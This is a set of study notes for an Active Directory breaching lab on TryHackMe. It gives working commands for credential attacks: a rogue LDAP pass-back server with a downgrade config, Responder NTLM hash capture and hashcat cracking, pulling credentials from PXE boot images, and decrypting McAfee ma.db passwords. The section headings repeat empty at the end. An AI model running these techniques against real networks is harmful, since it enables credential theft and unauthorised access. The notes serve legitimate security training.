## [https://tryhackme.com/room/breachingad](https://tryhackme.com/room/breachingad)

## [https://tryhackme.com/room/breachingad](https://tryhackme.com/room/breachingad)
 
## OSINT

HaveIBeenPwned  
DeHashed  
Creds in Stack Overflow, GitHub  
Cewl to find emails on webpage
 
## Phishing

Mimicking a webpage  
Email link that installs remote access trojan
 
## LDAP Bind credentials

Really cool but its too much to put here.  
[https://tryhackme.com/room/breachingad](https://tryhackme.com/room/breachingad)
 
The following devices, and others use LDAP for authentication (app to user direct):

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs 
Many times they keep default creds: admin:admin / admin:password
 
## LDAP Pass-Back

If you have access to one of these devices and they are connected to the internet, you can set up a rogue LDAP server and force downgrading and have the device connect and try to authenticate to you, so you can see the creds in plaintext.
 
### Download LDAP:

sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
 
### Configure the server:

sudo dpkg-reconfigure -p low slapd
 ![Exported image](Exported%20image%2020250424155721-0.png) ![Exported image](Exported%20image%2020250424155721-1.png) ![Exported image](Exported%20image%2020250424155726-2.png) ![Exported image](Exported%20image%2020250424155726-3.png) ![Exported image](Exported%20image%2020250424155727-4.png) ![Exported image](Exported%20image%2020250424155728-5.png) ![Exported image](Exported%20image%2020250424155729-6.png)  

### Create a file called "olcSaslSecProps.ldif" and add the following for downgrade attack:

dn: cn=config￼replace: olcSaslSecProps￼olcSaslSecProps: noanonymous,minssf=0,passcred
 
### Patch your ldap server to use the new rule:

sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
 
### Verify support for plain and login:

ldapsearch -H ldap:// -x -LLL -s base -b ""supportedSASLMechanisms
 
Make the request from the device to your ldap server and await response  
If it doesn't work, try:  
sudotcpdump -SX -i breachad tcp port 389
 
## NetNTLM with SMB

Use Responder to answer challenge requests from SMB service and extract the response containing a user NTLMv2-SSP hash
 
git clone "[https://github.com/lgandx/Responder.git](https://github.com/lgandx/Responder.git)"  
sudo responder -I ALL -i <attacker_ip>
 
Crack the NTLM hash offline:  
hashcat -m 5600 <hash file> <password file> --force
 
## Preboot Execution Environment (PXE) boot

x64{FC598DA4-EC53-49BE-94BC-C0180D6AC003}.bcd
 
### Get the boot info from the bcd files:

tftp -i <MDT_IP> GET "\Tmp\<.BCD file name>" conf.bcd
 
### Use [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read contents of bcd file and get location of boot image:

Import-Module .\PowerPXE.ps1￼$BCDFile = "conf.bcd"￼Get-WimFile -bcdFile $BCDFile
 
### Download boot image:

tftp -i <MDT_IP> GET "<PXEBootImageLocation>" pxeboot.wim
 
### Recover creds from PXE boot image:

Manually look in the bootstrap.ini file;  
OR  
Get-FindCredentials -WimFile pxeboot.wim
 
## Configuration Files

Search these types of files for AD creds:

- Web application config files
- Service configuration files
- Registry keys
- Centrally deployed applications
- McAfee Enterprise Endpoint Security's 'ma.db' file 
You can use [seatbelt](https://github.com/GhostPack/Seatbelt) to automate this search
 
Go to file:  
cd C:\ProgramData\McAfee\Agent\DB
 
Copy file to kali:  
Scp <host>@<domain>:C:/ProgramData/McAfee/Agent/DB/ma.db .
 
View the data:  
sqlitebrowser ma.db
 
Browse Data >> AGENT_REPOSITORIES >> DOMAIN, AUTH_USER, AUTH_PASS
 
**Password is encrypted, but with known key.
 
Download this [tool](https://github.com/funoverip/mcafee-sitelist-pwd-decryption) (mcafee sitelist pwd decrypt)(uses python2, sometimes doesn’t work)  
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
   
 
## OSINT
 
## Phishing
 
## LDAP Bind credentials
    
## LDAP Pass-Back
 
### Download LDAP:
 
### Configure the server:
   

### Create a file called "olcSaslSecProps.ldif" and add the following for downgrade attack:
 
### Patch your ldap server to use the new rule:
 
### Verify support for plain and login:
   

## NetNTLM with SMB
    
## Preboot Execution Environment (PXE) boot
 
### Get the boot info from the bcd files:
 
### Use [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read contents of bcd file and get location of boot image:
 
### Download boot image:
 
### Recover creds from PXE boot image:
 
## Configuration Files